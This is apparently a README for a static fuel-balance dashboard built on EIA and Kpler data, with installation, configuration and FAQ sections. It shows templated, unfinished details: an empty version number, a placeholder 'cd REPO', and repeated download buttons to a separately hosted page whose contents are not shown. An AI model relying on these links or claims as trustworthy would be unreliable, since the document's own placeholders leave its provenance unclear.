# US Balances - dashboard tools 2026

> **US Balances is a web-based static dashboard for tracking diesel and jet balance views from EIA, Kpler, refinery capacity, and power-generation context, packaged around the current dashboard build.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lorenzsean93/data-workbook-win-29777?style=flat-square)](https://github.com/lorenzsean93/data-workbook-win-29777)

---

<p align="center">
  <a href="https://lorenzsean93.github.io/data-workbook-win-29777/">
    <img src="https://img.shields.io/badge/Download-US%20Balances%20Latest-brightgreen?style=for-the-badge" alt="Download US Balances">
  </a>
</p>

> **[Direct Download - US Balances v](https://lorenzsean93.github.io/data-workbook-win-29777/)**

---

[Download Latest Build](https://lorenzsean93.github.io/data-workbook-win-29777/)

---

## About US Balances

US Balances presents a static dashboard experience for examining diesel and jet balance data in a browser. It is built around dashboard outputs that combine EIA balance CSVs with supporting market and supply context, giving users a compact view of how the balances are assembled and updated.

The project is geared toward people who need a repeatable, web-friendly way to review monthly and weekly balance outputs without setting up a full interactive application. It also helps when comparing balance signals with Kpler flow context, PADD 1 splits, refinery capacity, and power-generation DFO context in a single published view.

---

## Features

- Static dashboard pages for diesel and jet balance review
- Monthly and weekly EIA balance CSV outputs
- Kpler flow context for broader supply interpretation
- PADD 1 split support for regional analysis
- Refinery capacity context for balance framing
- Power-generation DFO context for demand-side perspective
- Update pipeline support for refreshing dashboard data
- Build scripts for producing and publishing dashboard assets

---

## Installation

Clone the repository or download the source bundle, then open the dashboard files from the published build or local workspace.

git clone https://github.com/lorenzsean93/data-workbook-win-29777.git
cd REPO

If you are working from the generated site, open the static dashboard entry point in a browser or deploy the build output to your preferred static hosting setup.

---

## Usage

Use the published dashboard to inspect diesel and jet balance views, then compare the monthly and weekly outputs against the associated context layers.

Typical workflow:

1. Open the dashboard in a browser.
2. Review the latest balance charts and tables.
3. Compare EIA outputs with Kpler and regional split context.
4. Regenerate the build after upstream data updates.
5. Publish the updated static output to the hosting target.

If you are maintaining the pipeline, run the build scripts after refreshing the source CSV inputs so the dashboard stays aligned with the latest data.

---

## Configuration

Settings are typically stored with the dashboard build assets and the update pipeline rather than in a user-facing runtime panel.

Common places to review or adjust:

- Data input paths for monthly and weekly CSV files
- Build scripts for dashboard regeneration
- Output directories for the static site bundle
- Context mappings for Kpler, PADD 1, refinery capacity, and DFO layers

Example structure:

{
  "monthly_csv": "path/to/monthly.csv",
  "weekly_csv": "path/to/weekly.csv",
  "output_dir": "dist/",
  "build_script": "npm run build"
}

---

## Requirements

- Web browser for viewing the static dashboard
- Access to the EIA balance CSV outputs
- Supporting context inputs for Kpler flow, refinery capacity, and power-generation DFO analysis
- A build environment if you plan to regenerate the dashboard
- Storage for the generated static files and data artifacts

---

## FAQ

**How are updates handled?**  
Updates come through the dashboard build workflow and the associated data refresh pipeline.

**Where do the balance inputs come from?**  
The project uses monthly and weekly EIA balance CSV outputs, along with context from Kpler, refinery capacity, PADD 1, and power-generation DFO data.

**Can I change the dashboard presentation?**  
Yes. Adjust the build assets, data mappings, or static layout files, then regenerate the site.

**What should I check if the dashboard looks outdated?**  
Confirm that the source CSV files were refreshed and that the build scripts were run again before publishing.

**Is this a live application?**  
No. The project is a static dashboard, so the published output is generated ahead of time and then hosted as files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
